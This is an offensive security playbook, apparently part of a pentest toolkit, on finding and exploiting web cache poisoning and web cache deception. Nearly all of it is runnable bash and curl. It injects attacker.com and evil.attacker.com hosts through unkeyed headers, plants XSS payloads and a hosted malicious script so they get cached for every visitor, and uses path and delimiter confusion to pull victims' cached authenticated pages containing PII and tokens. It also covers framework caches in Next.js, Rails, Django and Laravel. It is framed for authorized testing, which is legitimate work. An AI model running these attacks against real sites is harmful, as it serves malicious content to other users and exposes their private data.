# Playbook: Web Cache Poisoning & Cache Deception

## Purpose
Detect and exploit Web Cache Poisoning and Web Cache Deception vulnerabilities.
Cache poisoning injects malicious content into cached responses served to other users.
Cache deception tricks the cache into storing authenticated responses accessible to attackers.
Input: target URL, endpoint list, or CDN-fronted application.

---

## Theory — How Web Caches Work

**Cache layers:** CDN (Cloudflare, CloudFront, Akamai, Fastly), reverse proxy
(Varnish, Nginx, HAProxy), and application-level caches (framework built-in,
Redis/Memcached response caches).

**Cache key:** The subset of the request that the cache uses to identify a unique
response. Typically: `Host + Path + Query String`. Everything else is ignored.

**Unkeyed inputs:** Headers, cookies, and request components NOT included in the
cache key. If the application uses an unkeyed input to build the response, an
attacker can inject content via that input, get it cached, and serve it to all
subsequent users who hit the same cache key.

**Cache Poisoning vs Cache Deception:**
- Poisoning: attacker controls WHAT gets cached (inject malicious content)
- Deception: attacker controls THAT something gets cached (trick cache into
  storing a victim's authenticated response, then access it)

---

## Step 1 — Identify Cache Behavior

```bash
TARGET="https://TARGET"

# Check cache-related response headers
curl -sk -D- -o /dev/null "${TARGET}/" | grep -iE \
  "^(cache-control|x-cache|cf-cache-status|age|x-varnish|x-served-by|x-cache-hits|via|x-fastly|x-amz-cf|cdn-cache|x-proxy-cache|pragma|expires|vary|surrogate-control):"

# Send the same request twice — check if Age increments or X-Cache changes
echo "--- Request 1 ---"
curl -sk -D- -o /dev/null "${TARGET}/"
sleep 2
echo "--- Request 2 ---"
curl -sk -D- -o /dev/null "${TARGET}/"
# If Age increases or X-Cache changes from MISS to HIT → caching is active

# Identify CDN provider from headers
curl -sk -I "${TARGET}/" | grep -iE "^(server|via|x-served-by|cf-ray|x-amz-cf-id|x-fastly)"

# Timing-based cache detection
# First request (cache miss) vs second request (cache hit)
for i in 1 2 3; do
  time_total=$(curl -sk -o /dev/null -w "%{time_total}" "${TARGET}/")
  echo "Request $i: ${time_total}s"
done
# Significant drop in response time on repeat requests indicates caching
```

---

## Step 2 — Cache Buster Setup (Safe Testing)

Always use cache busters to avoid poisoning production caches during testing:

```bash
# Cache buster parameter — unique per test, ensures a fresh cache entry
CB="cbtest$(date +%s)"

# Append to every test URL
curl -sk "${TARGET}/page?cb=${CB}" -D-

# Verify the cache buster works:
# 1. Send request with cb=unique1 → should get X-Cache: MISS
# 2. Send same request with cb=unique1 → should get X-Cache: HIT
# 3. Send request with cb=unique2 → should get X-Cache: MISS again
# If all three behave as expected, the CB param is keyed and safe to use

# Alternative cache busters (if query params are stripped):
# - Vary the Accept-Encoding value
# - Use a unique path segment: /page/cb12345/
# - Use the Origin header if Vary: Origin is set
```

---

## Step 3 — Unkeyed Header Detection (Cache Poisoning)

```bash
TARGET="https://TARGET"
CB="cb$(date +%s)"

# Test unkeyed headers that may influence the response
# For each header: inject a canary value, check if it appears in the response

# X-Forwarded-Host — commonly reflected in links, redirects, meta tags
curl -sk "${TARGET}/?${CB}1" \
  -H "X-Forwarded-Host: poisoned.attacker.com" | grep -i "poisoned.attacker.com"

# X-Forwarded-Scheme / X-Forwarded-Proto — can force redirect to HTTP
curl -sk "${TARGET}/?${CB}2" \
  -H "X-Forwarded-Scheme: http" -D- | grep -i "location:"
curl -sk "${TARGET}/?${CB}3" \
  -H "X-Forwarded-Proto: http" -D- | grep -i "location:"

# X-Original-URL / X-Rewrite-URL — path override (IIS/Nginx)
curl -sk "${TARGET}/?${CB}4" \
  -H "X-Original-URL: /admin" -D-
curl -sk "${TARGET}/?${CB}5" \
  -H "X-Rewrite-URL: /admin" -D-

# X-Forwarded-Port — can alter generated URLs
curl -sk "${TARGET}/?${CB}6" \
  -H "X-Forwarded-Port: 1337" | grep "1337"

# X-Host / X-Forwarded-Server
curl -sk "${TARGET}/?${CB}7" \
  -H "X-Host: poisoned.attacker.com" | grep -i "poisoned"
curl -sk "${TARGET}/?${CB}8" \
  -H "X-Forwarded-Server: poisoned.attacker.com" | grep -i "poisoned"

# Transfer-Encoding variations (request smuggling adjacent)
# X-HTTP-Method-Override
curl -sk "${TARGET}/?${CB}9" \
  -H "X-HTTP-Method-Override: POST" -D-

# Batch test with param-miner headers wordlist
# Manual equivalent:
HEADERS=(
  "X-Forwarded-Host" "X-Forwarded-Scheme" "X-Forwarded-Proto"
  "X-Original-URL" "X-Rewrite-URL" "X-Forwarded-Port"
  "X-Host" "X-Forwarded-Server" "X-Forwarded-For"
  "X-Real-IP" "X-Custom-IP-Authorization" "X-Originating-IP"
  "CF-Connecting-IP" "True-Client-IP" "Fastly-Client-IP"
  "X-Azure-ClientIP" "X-Client-IP"
)

CANARY="cachepoisontest.attacker.com"
for hdr in "${HEADERS[@]}"; do
  CB="cb$(date +%s%N)"
  result=$(curl -sk "${TARGET}/?${CB}" -H "${hdr}: ${CANARY}")
  if echo "$result" | grep -qi "$CANARY"; then
    echo "[REFLECTED] ${hdr} is reflected in response (potentially unkeyed)"
  fi
done
```

---

## Step 4 — Parameter-Based Cache Poisoning

```bash
TARGET="https://TARGET"

# Parameter cloaking — semicolons as parameter separators
# Some servers treat ; as & but caches may not key on ;-separated params
CB="cb$(date +%s)"
curl -sk "${TARGET}/page?${CB};utm_content=<script>alert(1)</script>" | grep "alert(1)"

# Ruby on Rails / Rack treat ; as parameter separator
curl -sk "${TARGET}/page?${CB};callback=<script>alert(1)</script>"

# HTTP Parameter Pollution (HPP)
# Send duplicate parameters — first may be cached, second may be processed
curl -sk "${TARGET}/page?param=safe&param=<script>alert(1)</script>"

# Unkeyed query parameters
# Some CDNs strip or ignore certain parameters (utm_*, fbclid, etc.)
UNKEYED_PARAMS=("utm_source" "utm_medium" "utm_campaign" "utm_content"
                "utm_term" "fbclid" "gclid" "mc_cid" "mc_eid" "_ga")

for param in "${UNKEYED_PARAMS[@]}"; do
  CB="cb$(date +%s%N)"
  # Check if param value is reflected but not part of cache key
  curl -sk "${TARGET}/page?${CB}&${param}=CANARY12345" | grep -q "CANARY12345" && \
    echo "[REFLECTED] ${param} reflected — test if unkeyed"
done

# Fat GET request — body in GET requests
# Some frameworks read body params even on GET; cache ignores body
CB="cb$(date +%s)"
curl -sk -X GET "${TARGET}/page?${CB}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=<script>alert(1)</script>" | grep "alert(1)"

# Verify caching of fat GET
curl -sk -X GET "${TARGET}/page?${CB}" | grep "alert(1)"
# If the payload appears without sending the body → cache poisoned
```

---

## Step 5 — Host Header Cache Poisoning

```bash
TARGET="https://TARGET"
CB="cb$(date +%s)"

# Duplicate Host header
curl -sk "${TARGET}/page?${CB}" \
  -H "Host: TARGET" \
  -H "Host: attacker.com" | grep -i "attacker.com"

# Absolute URL with different Host
# Send: GET https://TARGET/page HTTP/1.1 + Host: attacker.com
curl -sk --request-target "https://TARGET/page?${CB}" \
  -H "Host: attacker.com" "https://TARGET/" | grep -i "attacker.com"

# Port-based poisoning
curl -sk "${TARGET}/page?${CB}" \
  -H "Host: TARGET:1337" | grep "1337"

# Host header with @ (URL parsing confusion)
curl -sk "${TARGET}/page?${CB}" \
  -H "Host: TARGET@attacker.com" | grep -i "attacker"
```

---

## Step 6 — Cache Poisoning Attack Chains

### Stored XSS via Cache Poisoning

```bash
TARGET="https://TARGET"

# If X-Forwarded-Host is reflected in <link>, <script src>, or <meta> tags:
CB="cb$(date +%s)"

# Step 1: Confirm reflection
curl -sk "${TARGET}/?${CB}" \
  -H "X-Forwarded-Host: attacker.com" | grep -i "attacker.com"

# Step 2: Inject payload into resource URL
# If reflected in: <link rel="canonical" href="https://X-FORWARDED-HOST/...">
curl -sk "${TARGET}/" \
  -H 'X-Forwarded-Host: attacker.com"/><script>alert(1)</script><link x="'

# If reflected in: <script src="https://X-FORWARDED-HOST/static/app.js">
curl -sk "${TARGET}/" \
  -H "X-Forwarded-Host: attacker-server.com"
# Host attacker-server.com/static/app.js with malicious JS

# Step 3: Verify the cache stored the poisoned response
curl -sk "${TARGET}/" | grep -i "attacker"
# If payload appears without the header → all visitors get XSS
```

### Cache Poisoning + Open Redirect

```bash
# If X-Forwarded-Scheme forces HTTP redirect:
CB="cb$(date +%s)"
curl -sk "${TARGET}/?${CB}" \
  -H "X-Forwarded-Scheme: http" -D- | grep -i "location:"

# Chain: force redirect to attacker via scheme downgrade + host override
curl -sk "${TARGET}/?${CB}" \
  -H "X-Forwarded-Scheme: http" \
  -H "X-Forwarded-Host: attacker.com" -D- | grep -i "location:"
# If Location: http://attacker.com/... → redirect chain cached
```

### Cache Poisoning via Vary Header Abuse

```bash
# If Vary includes a header the attacker can control
curl -sk -I "${TARGET}/" | grep -i "^vary:"

# If Vary: User-Agent → different cache entries per User-Agent
# Poison a specific User-Agent cache bucket
curl -sk "${TARGET}/" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -H "X-Forwarded-Host: attacker.com"

# All Chrome/Windows users now get poisoned response
```

---

## Step 7 — Web Cache Deception

### Path Confusion Attacks

```bash
TARGET="https://TARGET"

# Core idea: trick the cache into storing a dynamic authenticated response
# by appending a static-looking extension to a dynamic URL

# The victim visits a crafted URL. The origin serves the dynamic page,
# but the cache thinks it is a static file and stores it.
# The attacker then requests the same URL (unauthenticated) and gets
# the victim's cached authenticated response.

# Step 1: Identify dynamic authenticated endpoints
# /account, /profile, /settings, /dashboard, /api/me, /user/info

# Step 2: Test path confusion — append static extensions
DYNAMIC="/account/settings"
EXTENSIONS=(".css" ".js" ".png" ".gif" ".jpg" ".svg" ".ico" ".woff2" ".pdf" ".json")

for ext in "${EXTENSIONS[@]}"; do
  url="${TARGET}${DYNAMIC}/nonexistent${ext}"
  status=$(curl -sk -o /dev/null -w "%{http_code}" "$url" \
    -H "Cookie: session=VALID_SESSION_TOKEN")
  cache=$(curl -sk -D- -o /dev/null "$url" \
    -H "Cookie: session=VALID_SESSION_TOKEN" | grep -i "x-cache\|cf-cache-status\|age:")
  echo "[${status}] ${url} | Cache: ${cache}"
done

# Step 3: Test path traversal confusion
# Origin normalizes: /account/settings/..%2Fnonexistent.css → /account/settings
# CDN does not normalize: caches /account/settings/..%2Fnonexistent.css as static
PATHS=(
  "${DYNAMIC}/nonexistent.css"
  "${DYNAMIC}/..%2Fnonexistent.css"
  "${DYNAMIC}/..%5Cnonexistent.css"
  "${DYNAMIC}/../nonexistent.css"
  "${DYNAMIC}/anything.css"
  "${DYNAMIC}/.css"
  "${DYNAMIC}/.js"
)

for path in "${PATHS[@]}"; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" "${TARGET}${path}" \
    -H "Cookie: session=VALID_SESSION_TOKEN")
  echo "[${status}] ${path}"
  # If 200 → origin served the dynamic page despite the static-looking path
done
```

### Delimiter Confusion Attacks

```bash
TARGET="https://TARGET"
DYNAMIC="/account/settings"

# Different servers treat delimiters differently
# Origin may ignore everything after the delimiter
# CDN may include it in the cache key as part of the path

DELIMITERS=(
  ";"       # /account/settings;.css
  "%0A"     # /account/settings%0A.css (newline)
  "%0D"     # /account/settings%0D.css (carriage return)
  "%00"     # /account/settings%00.css (null byte)
  "%23"     # /account/settings%23.css (encoded #)
  "%3F"     # /account/settings%3F.css (encoded ?)
  "%09"     # /account/settings%09.css (tab)
  "?"       # /account/settings?.css (query as path)
)

for delim in "${DELIMITERS[@]}"; do
  url="${TARGET}${DYNAMIC}${delim}.css"
  response=$(curl -sk -D- "${url}" -H "Cookie: session=VALID_SESSION_TOKEN")
  status=$(echo "$response" | head -1)
  cache=$(echo "$response" | grep -i "x-cache\|cf-cache-status")
  # Check if dynamic content was returned
  has_pii=$(echo "$response" | grep -ci "email\|name\|token\|session")
  echo "[${status}] delim=${delim} | Cache: ${cache} | PII indicators: ${has_pii}"
done
```

### Normalization Difference Exploitation

```bash
# CDN and origin may normalize paths differently
# CDN: treats /account/settings/..%2Fstatic.css as a path to a .css file → caches it
# Origin: decodes %2F → resolves /account/settings/../static.css → /account/static.css
# or ignores the path traversal and serves /account/settings

# Double-encoding test
curl -sk "${TARGET}/account/settings/%2e%2e/static.css" \
  -H "Cookie: session=VALID_SESSION_TOKEN" -D-

curl -sk "${TARGET}/account/settings/%252e%252e/static.css" \
  -H "Cookie: session=VALID_SESSION_TOKEN" -D-

# Backslash vs forward slash
curl -sk "${TARGET}/account/settings\static.css" \
  -H "Cookie: session=VALID_SESSION_TOKEN" -D-

# Case sensitivity differences
curl -sk "${TARGET}/Account/Settings/x.css" \
  -H "Cookie: session=VALID_SESSION_TOKEN" -D-
```

---

## Step 8 — CDN-Specific Behaviors

### Cloudflare

```bash
# Cache key: scheme + host + path + query string (sorted)
# Identifies cached responses via: CF-Cache-Status header
# Values: HIT, MISS, EXPIRED, DYNAMIC, BYPASS

# Cloudflare default: only caches static extensions (.css, .js, .png, etc.)
# unless Page Rules or Cache Rules override this

# Test Cloudflare caching
curl -sk -I "${TARGET}/page" | grep "cf-cache-status"

# Cloudflare does NOT cache HTML by default
# If CF-Cache-Status: HIT on HTML → custom caching rules active → deception possible

# Cloudflare path normalization: decodes percent-encoding before forwarding
# This means %2F in path is decoded to / before reaching origin
```

### CloudFront (AWS)

```bash
# Cache key: Host + path + query string (configurable)
# Headers: X-Cache (Hit from cloudfront / Miss from cloudfront)
# X-Amz-Cf-Id, X-Amz-Cf-Pop

# CloudFront can be configured to forward specific headers/cookies
# Default: does NOT forward most headers → large unkeyed surface

curl -sk -I "${TARGET}/page" | grep -i "x-cache\|x-amz-cf"

# CloudFront normalized paths: /page and /page/ may be different cache keys
# Test trailing slash behavior
curl -sk -I "${TARGET}/page" | grep "x-cache"
curl -sk -I "${TARGET}/page/" | grep "x-cache"
```

### Akamai

```bash
# Cache key: configurable, often includes Host + path + specific query params
# Headers: X-Cache, X-Cache-Key (sometimes exposed), X-Akamai-Transformed

# Akamai may expose the full cache key:
curl -sk -I "${TARGET}/" | grep -i "x-cache-key"
# If present → exact cache key components are visible

# Akamai pragma debug headers (if enabled):
curl -sk -I "${TARGET}/" \
  -H "Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key" \
  | grep -i "x-cache\|x-check-cacheable\|x-cache-key"
```

### Fastly / Varnish

```bash
# Varnish: X-Varnish header (two IDs = cache hit), Age header
# Fastly: X-Served-By, X-Cache (HIT/MISS), X-Cache-Hits, X-Timer

curl -sk -I "${TARGET}/" | grep -i "x-varnish\|x-served-by\|x-cache-hits\|x-timer"

# Varnish default: strips cookies from cacheable responses
# If Vary: Cookie is NOT set → authenticated responses may be cached

# Fastly surrogate keys:
curl -sk -I "${TARGET}/" | grep -i "surrogate-key\|surrogate-control"
```

### Cache-Control Misconfigurations

```bash
# Look for dangerous cache configurations
curl -sk -I "${TARGET}/api/me" | grep -i "cache-control"

# Dangerous patterns:
# Cache-Control: public              → CDN will cache, even with Set-Cookie
# Cache-Control: max-age=3600        → cached for 1 hour (no private/no-store)
# Cache-Control: s-maxage=3600       → shared cache (CDN) caches for 1 hour
# No Cache-Control header at all     → CDN may apply default caching rules

# Safe patterns:
# Cache-Control: private, no-store   → not cached by CDN
# Cache-Control: no-cache            → must revalidate (still stored)

# Check authenticated endpoints for missing cache prevention
ENDPOINTS=("/api/me" "/api/user" "/account" "/profile" "/settings"
           "/dashboard" "/api/billing" "/api/tokens")

for ep in "${ENDPOINTS[@]}"; do
  cc=$(curl -sk -I "${TARGET}${ep}" \
    -H "Cookie: session=VALID_TOKEN" | grep -i "cache-control")
  echo "${ep}: ${cc:-[NO CACHE-CONTROL HEADER]}"
done
```

---

## Step 9 — Full Cache Deception Attack Flow

```bash
# Complete attack simulation (authorized testing only)

TARGET="https://TARGET"
DYNAMIC="/account/settings"

# 1. As authenticated user, visit the crafted URL
CRAFTED="${TARGET}${DYNAMIC}/test.css"
curl -sk "${CRAFTED}" -H "Cookie: session=VICTIM_SESSION" -D- > /tmp/cache_deception_auth.txt

# 2. Check if response was cached
grep -i "cf-cache-status\|x-cache" /tmp/cache_deception_auth.txt

# 3. As unauthenticated user, request the same URL
curl -sk "${CRAFTED}" -D- > /tmp/cache_deception_unauth.txt

# 4. Check if cached authenticated content is returned
grep -i "cf-cache-status\|x-cache" /tmp/cache_deception_unauth.txt

# 5. Compare responses — if unauth response contains auth data → confirmed
diff <(grep -i "email\|name\|token" /tmp/cache_deception_auth.txt) \
     <(grep -i "email\|name\|token" /tmp/cache_deception_unauth.txt)

# Impact: attacker steals PII, session tokens, CSRF tokens, API keys
# from the cached authenticated response
```

---

## Step 10 — Automation with Tools

### param-miner (Burp Suite Extension)

```
# Install via BApp Store in Burp Suite Pro
# Right-click target request → Extensions → Param Miner → Guess Headers

# param-miner automatically:
# 1. Identifies unkeyed headers
# 2. Identifies unkeyed cookies
# 3. Identifies unkeyed query parameters
# 4. Reports reflected unkeyed inputs

# Key settings:
# - Enable "Add dynamic cachebuster"
# - Enable "Include cache busters in header values"
# - Set "Max one per host" to avoid flooding
```

### Web Cache Vulnerability Scanner (wcvs)

```bash
# Install
go install github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest

# Basic scan
wcvs -u "https://TARGET/" -hw "attacker.com"

# With custom headers wordlist
wcvs -u "https://TARGET/" -hw "attacker.com" -wl headers_wordlist.txt
```

### Custom curl Testing Script

```bash
#!/bin/bash
# cache_poison_test.sh — quick cache poisoning probe
TARGET="$1"
CALLBACK="$2"  # attacker-controlled domain

if [ -z "$TARGET" ] || [ -z "$CALLBACK" ]; then
  echo "Usage: $0 <target_url> <callback_domain>"
  exit 1
fi

HEADERS=(
  "X-Forwarded-Host" "X-Forwarded-Scheme" "X-Forwarded-Proto"
  "X-Original-URL" "X-Rewrite-URL" "X-Forwarded-Port"
  "X-Host" "X-Forwarded-Server" "X-Forwarded-For"
  "X-Real-IP" "Forwarded" "CF-Connecting-IP" "True-Client-IP"
)

echo "=== Cache Poisoning Header Probe ==="
echo "Target: ${TARGET}"
echo "Callback: ${CALLBACK}"
echo ""

for hdr in "${HEADERS[@]}"; do
  CB="cb$(date +%s%N)"
  response=$(curl -sk "${TARGET}?${CB}" -H "${hdr}: ${CALLBACK}" -D-)
  cache_status=$(echo "$response" | grep -i "x-cache\|cf-cache-status\|age:" | tr '\n' ' ')

  if echo "$response" | grep -qi "${CALLBACK}"; then
    echo "[HIT] ${hdr} reflected | Cache: ${cache_status}"
  fi
done

echo ""
echo "=== Cache Deception Path Probe ==="

PATHS=("/nonexistent.css" "/nonexistent.js" "/..%2Fnonexistent.css"
       ";.css" "%0A.css" "/.css")

for path in "${PATHS[@]}"; do
  url="${TARGET}${path}"
  response=$(curl -sk -D- -o /dev/null "${url}")
  status=$(echo "$response" | head -1 | awk '{print $2}')
  cache=$(echo "$response" | grep -i "x-cache\|cf-cache-status" | tr '\n' ' ')
  echo "[${status}] ${url} | ${cache}"
done
```

```bash
# Run the script
chmod +x cache_poison_test.sh
./cache_poison_test.sh "https://TARGET/account" "attacker.com"
```

### Nuclei Templates

```bash
# Run cache poisoning/deception templates
nuclei -u "https://TARGET/" -tags cache -v

# Specific template categories
nuclei -u "https://TARGET/" -t http/vulnerabilities/ -tags cache-poisoning
nuclei -u "https://TARGET/" -t http/misconfiguration/ -tags cache
```

---

## Output

```
ASSET         : https://target.com/
ATTACK TYPE   : Web Cache Poisoning via X-Forwarded-Host
UNKEYED INPUT : X-Forwarded-Host header
REFLECTION    : <link rel="canonical" href="https://INJECTED_VALUE/page">
CACHE STATUS  : CF-Cache-Status: HIT (TTL ~3600s)
SEVERITY      : HIGH (P2) — Stored XSS via cache poisoning
IMPACT        : All users visiting the cached URL receive attacker-controlled
                JavaScript. Session hijacking, credential theft, defacement.
EVIDENCE      : [request with X-Forwarded-Host + follow-up request showing
                 cached poisoned response without the header]
NEXT STEPS    :
  1. Test other endpoints for same unkeyed header reflection
  2. Chain with open redirect for broader impact
  3. Test cache deception on authenticated endpoints
  4. Load 03_reporting/report_writer.md — write report
```

```
ASSET         : https://target.com/account/settings
ATTACK TYPE   : Web Cache Deception via path confusion
VECTOR        : /account/settings/nonexistent.css
CACHE STATUS  : X-Cache: HIT (Cloudflare caches .css extension)
ORIGIN BEHAVIOR: Returns dynamic /account/settings page (ignores trailing path)
SEVERITY      : HIGH (P2) — Authenticated data exposure
IMPACT        : Attacker crafts link, victim clicks it, CDN caches their
                authenticated response. Attacker retrieves cached response
                containing PII, CSRF tokens, session data.
EVIDENCE      : [authenticated request to crafted URL → unauthenticated request
                 returns same response with user PII]
NEXT STEPS    :
  1. Test all authenticated endpoints for same behavior
  2. Test additional path confusion techniques (delimiters, encoding)
  3. Assess PII/token exposure in cached responses
  4. Load 03_reporting/severity_scorer.md — score impact
  5. Load 03_reporting/report_writer.md — write report
```

---

## Step 11 — Framework-Level Internal Cache Poisoning (PortSwigger Top 10 2025 #7)

Most cache poisoning research targets CDN-level or reverse-proxy caches. But
modern web frameworks ship their own internal caching layers that operate
independently of any external CDN. Poisoning these internal caches is often
more dangerous because:

1. Framework caches sit closer to the application logic and may cache
   sensitive, personalized, or authenticated content by default.
2. There is no CDN configuration to audit -- the caching behavior is
   determined by application code and framework defaults.
3. Internal caches are invisible to standard cache-header analysis
   (no X-Cache, CF-Cache-Status, Age headers to observe).
4. Developers often assume "no CDN = no cache poisoning risk."

### Next.js Internal Cache Poisoning

Based on "Next.js, cache, and chains: the stale elixir" by Rachid Allam
(PortSwigger Top 10 2025, #7), which demonstrated internal cache poisoning
in Next.js through source-code analysis of the framework's caching internals.

#### How Next.js Caching Works

Next.js implements multiple caching layers:

- **Full Route Cache**: Pre-renders routes at build time, stores HTML and RSC
  payload on disk. Applies to static and ISR (Incremental Static Regeneration)
  pages.
- **Data Cache**: Caches the results of `fetch()` calls made during server-side
  rendering. Persists across requests and deployments by default.
- **Router Cache**: Client-side in-memory cache of RSC payloads for visited
  routes (not relevant for server-side poisoning).
- **ISR Cache**: The most interesting target. Pages using `revalidate` are
  served from cache and regenerated in the background after the revalidation
  interval expires. During regeneration, the stale version is served --
  meaning a poisoned entry persists until the next successful regeneration.

#### ISR Cache Poisoning Technique

```bash
TARGET="https://TARGET"

# Step 1: Identify ISR-enabled pages
# ISR pages return cache-related headers from Next.js itself
curl -sk -D- "${TARGET}/" | grep -iE "^(x-nextjs-cache|x-vercel-cache|cache-control):"
# x-nextjs-cache: HIT    → page is served from ISR cache
# x-nextjs-cache: STALE  → page is being regenerated
# x-nextjs-cache: MISS   → page was just regenerated

# Step 2: Identify unkeyed inputs that influence ISR page content
# Next.js ISR cache key is typically just the pathname
# Headers, cookies, and query parameters may influence the rendered
# output but NOT the cache key

# Test Host header influence on ISR-cached pages
CB_PATH="/test-$(date +%s)"
curl -sk "${TARGET}${CB_PATH}" \
  -H "Host: TARGET" \
  -H "X-Forwarded-Host: evil.attacker.com" | grep -i "evil.attacker.com"

# Test X-Forwarded-Proto influence (force HTTP URLs in cached page)
curl -sk "${TARGET}${CB_PATH}" \
  -H "X-Forwarded-Proto: http" | grep -i "http://TARGET"

# Step 3: Trigger ISR revalidation with poisoned input
# Wait for the revalidation window, then send the poisoned request
# The regenerated page will include the attacker's input and be cached

# Identify revalidation interval from Cache-Control header
curl -sk -I "${TARGET}/" | grep -i "cache-control"
# s-maxage=N indicates revalidation every N seconds

# Send poisoned request just as the cache expires (stale window)
# Multiple rapid requests increase the chance of being the one that
# triggers regeneration
for i in $(seq 1 10); do
  curl -sk "${TARGET}/" \
    -H "X-Forwarded-Host: evil.attacker.com" > /dev/null &
done
wait

# Verify: request the page normally and check for poisoned content
sleep 2
curl -sk "${TARGET}/" | grep -i "evil.attacker.com"
# If the attacker's value appears without sending the header,
# the ISR cache has been poisoned
```

#### Next.js Data Cache Poisoning

```bash
# The Next.js Data Cache stores fetch() results server-side.
# If an API route or server component uses request headers in a
# fetch() call without including them in the cache key, the
# cached response may contain attacker-controlled data.

# Example: a page that fetches user-specific content based on
# a header but caches the result globally

# Identify API routes that may use cached fetch()
# Look for: /api/* endpoints, getStaticProps, generateStaticParams

# Test: send requests with manipulated headers to API endpoints
# that feed data into cached pages
curl -sk "${TARGET}/api/config" \
  -H "X-Forwarded-Host: evil.attacker.com" \
  -H "Accept-Language: xx" | python3 -m json.tool

# If the API response changes based on unkeyed headers and is consumed
# by a cached page, the page will render poisoned data
```

#### Source-Code Analysis Approach (White-Box)

```
When you have access to the Next.js source code, look for:

1. pages/ or app/ directory: identify which routes use ISR
   - getStaticProps with revalidate property
   - app/ routes with export const revalidate = N
   - generateStaticParams combined with dynamicParams

2. Fetch calls without cache key customization:
   - fetch(url) without { next: { tags: [...] } }
   - fetch(url) that includes request headers in the URL or body
     but does not set { cache: 'no-store' }

3. Middleware (middleware.ts) that modifies request headers before
   they reach the page renderer -- these modifications may influence
   cached content without being part of the cache key.

4. next.config.js: check headers configuration for cache-control
   overrides and rewrites that might affect cache behavior.
```

### Other Framework Internal Caches

The same class of vulnerability applies to any framework with built-in
caching. The pattern is always the same: the framework caches rendered
output or data, keyed on a subset of the request, while the application
logic uses unkeyed request components to build the response.

#### Ruby on Rails Fragment Caching

```bash
# Rails fragment caching stores rendered view partials in the cache store
# (Redis, Memcached, or file system). Cache keys are developer-defined
# and often incomplete.

# Vulnerable pattern in Rails views:
#   <% cache("homepage_banner") do %>
#     <%= link_to "Home", root_url(host: request.host) %>
#   <% end %>
#
# The cache key is just "homepage_banner" but the content includes
# request.host -- an attacker-controlled value.

# Test: send requests with manipulated Host header
curl -sk "https://TARGET/" -H "Host: evil.attacker.com"
# Then request normally:
curl -sk "https://TARGET/"
# If the cached fragment contains the attacker's host, poisoning confirmed.

# Rails Russian Doll caching (nested fragments) can amplify the impact:
# poisoning an inner fragment poisons all outer fragments that include it.

# Key indicators in Rails apps:
# - X-Request-Id header present (Rails default)
# - Server: Puma or Passenger
# - ETag patterns consistent with Rails cache digests
```

#### Django Cache Framework

```bash
# Django provides per-view caching, template fragment caching, and
# low-level cache API. The per-view cache is the most interesting target.

# Django per-view cache with @cache_page decorator:
# Cache key = request path + query string + Vary headers
# But the rendered content may depend on other request attributes
# (Accept-Language, X-Forwarded-For, custom headers) that are not
# included in the cache key.

# Test: manipulate Vary-excluded headers on cached Django pages
# Django typically uses Vary: Cookie, Accept-Language

# If a page is cached but uses request.META['HTTP_X_FORWARDED_HOST']
# without including it in Vary:
curl -sk "https://TARGET/cached-page/" \
  -H "X-Forwarded-Host: evil.attacker.com" \
  -H "Accept-Language: en"

# Wait for cache expiry, trigger re-cache with poison
# Then verify:
curl -sk "https://TARGET/cached-page/" \
  -H "Accept-Language: en" | grep "evil.attacker.com"

# Django cache key indicators:
# - Djdt (Django Debug Toolbar) cookie if debug mode
# - csrftoken cookie
# - Server: WSGIServer or gunicorn/uvicorn behind nginx
# - Cache-Control headers set by @cache_page

# Django template fragment caching:
#   {% load cache %}
#   {% cache 300 sidebar %}
#     ... {{ request.get_host }} ...
#   {% endcache %}
# Cache key: "sidebar" -- but content uses request.get_host()
```

#### Laravel Cache (Illuminate Cache)

```bash
# Laravel provides route caching (response cache), view caching,
# and the Cache facade for arbitrary data. Third-party packages like
# spatie/laravel-responsecache add full response caching.

# spatie/laravel-responsecache:
# Default cache key = URL + query string + authenticated user
# But the middleware that generates the response may use request
# headers not included in the key.

# Test: identify Laravel apps (X-Powered-By, Set-Cookie patterns)
curl -sk -I "https://TARGET/" | grep -iE "(x-powered-by|laravel_session|XSRF-TOKEN)"

# Test header-based poisoning on cached routes
curl -sk "https://TARGET/" \
  -H "X-Forwarded-Host: evil.attacker.com"

# Laravel Blade view caching (@cache directive from packages):
# Same pattern -- cache key is developer-defined, rendered content
# may include request-dependent values.

# Laravel route cache (php artisan route:cache) is a different thing:
# it caches route definitions, not responses. Not relevant here.
```

### Framework Cache Poisoning Detection Methodology

```
For any target using a framework with internal caching:

1. Identify the framework (tech fingerprinting from 01_recon/tech_fingerprint.md)
2. Determine which caching mechanisms the framework offers
3. Identify cached pages/endpoints:
   - Consistent response times (no variation = likely cached)
   - Identical ETag/Last-Modified across requests
   - Framework-specific cache headers (x-nextjs-cache, etc.)
4. Test unkeyed inputs against cached endpoints:
   - X-Forwarded-Host, X-Forwarded-Proto, X-Forwarded-Port
   - Accept-Language, User-Agent (if not in Vary)
   - Custom application headers
5. Trigger cache regeneration with poisoned values
6. Verify poisoning persists for clean requests

Severity: typically HIGH (P2) -- all users see poisoned content
Escalation: if XSS payload can be injected via cache poisoning,
escalates to CRITICAL (P1) due to stored XSS impact
```
